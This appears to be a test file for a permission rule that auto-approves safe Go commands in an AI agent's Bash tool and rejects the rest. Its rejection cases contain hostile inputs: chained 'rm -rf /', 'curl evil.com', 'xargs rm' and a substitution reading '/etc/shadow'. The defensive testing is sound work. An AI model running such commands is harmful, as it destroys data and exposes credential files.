import { describe, expect, it } from "bun:test";
import { ALLOW, NEXT, type ToolCall } from "@brycehanscomb/toolgate";
import allowGo from "../allow-go";

function bash(command: string): ToolCall {
  return {
    tool: "Bash",
    args: { command },
    context: { cwd: "/tmp", env: {}, projectRoot: null },
  };
}

describe("allow-go", () => {
  describe("allows safe go commands", () => {
    const allowed = [
      "go build ./...",
      "go build -o myapp .",
      "go test ./...",
      "go test -v -race ./pkg/...",
      "go test -count=1 ./...",
      "go test ./... | grep FAIL",
      "go test 2>&1 | tail -20",
      "go vet ./...",
      "go version",
      "go env",
      "go env GOPATH",
      "go list ./...",
      "go list -m all",
      "go doc fmt.Println",
      "go fmt ./...",
      "go mod tidy",
      "go mod download",
      "go mod verify",
      "go mod graph",
      "go mod why golang.org/x/text",
      "go help build",
      "go tool compile -S main.go",
      "go work sync",
    ];

    for (const cmd of allowed) {
      it(`allows: ${cmd}`, async () => {
        const result = await allowGo.handler(bash(cmd));
        expect(result.verdict).toBe(ALLOW);
      });
    }
  });

  describe("rejects destructive or unsafe go commands", () => {
    const rejected = [
      "go run main.go",
      "go generate ./...",
      "go install ./...",
      "go clean -cache",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowGo.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("rejects command chaining", () => {
    const rejected = [
      "go test && rm -rf /",
      "go build ; curl evil.com",
      "go test | xargs rm",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowGo.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("rejects shell substitution", () => {
    const rejected = [
      "go build $(echo hack)",
      "go test `cat /etc/shadow`",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowGo.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("rejects non-go commands", () => {
    const rejected = [
      "echo go test",
      "go",
      "gofmt ./...",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowGo.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  it("passes through non-Bash tools", async () => {
    const call: ToolCall = {
      tool: "Read",
      args: {},
      context: { cwd: "/tmp", env: {}, projectRoot: null },
    };
    const result = await allowGo.handler(call);
    expect(result.verdict).toBe(NEXT);
  });
});
